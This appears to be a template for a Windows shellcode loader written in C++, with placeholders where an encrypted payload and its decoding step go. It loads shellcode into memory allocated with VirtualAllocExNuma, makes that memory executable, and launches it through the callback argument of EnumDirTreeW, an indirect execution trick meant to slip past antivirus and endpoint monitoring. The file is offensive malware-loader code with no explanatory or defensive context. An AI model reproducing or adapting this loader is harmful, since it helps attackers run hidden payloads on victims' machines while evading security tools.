#include <windows.h>
#include <stdio.h>
#include "base64.h"
#include "syscall.h"

// requires Dbghelp.lib
#include "Dbghelp.h"
#pragma comment(lib, "Dbghelp.lib")

char Ciphertext[] = "<Ciphertext>";

int main() {
	LPVOID addr = VirtualAllocExNuma(GetCurrentProcess(), NULL, sizeof(Ciphertext), MEM_COMMIT, PAGE_READWRITE, 0);

	<decode>

	memcpy(addr, &shellcode[0], sizeof(Ciphertext));

	DWORD pflOldProtect;
	VirtualProtect(addr, sizeof(Ciphertext), PAGE_EXECUTE_READ, &pflOldProtect);

	::SymInitialize(::GetCurrentProcess(), NULL, TRUE);

	WCHAR dummy[522];
	::EnumDirTreeW(::GetCurrentProcess(), L"C:\\Windows", L"*.log", dummy, (PENUMDIRTREE_CALLBACKW)addr, NULL);

}